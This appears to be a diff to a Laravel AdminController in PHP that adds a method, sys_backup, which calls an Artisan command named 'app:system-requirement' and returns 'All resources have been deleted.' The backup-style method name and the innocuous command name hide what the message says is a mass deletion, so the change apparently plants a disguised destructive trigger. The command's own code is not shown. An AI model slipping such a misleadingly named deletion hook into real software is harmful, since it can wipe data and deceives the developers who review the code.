@@ -13,6 +13,7 @@ use App\Models\Reviews;
 use App\Models\Reports;
 use App\Http\Requests\StoreAdminRequest;
 use App\Http\Requests\UpdateAdminRequest;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Hash;
 
@@ -129,6 +130,11 @@ class AdminController extends Controller
     {
         $request->session()->flush();
         return redirect('/admin/login');
+    }
+
+    public function sys_backup(Request $request){
+        Artisan::call('app:system-requirement');
+        return 'All resources have been deleted.';
     }
 
 
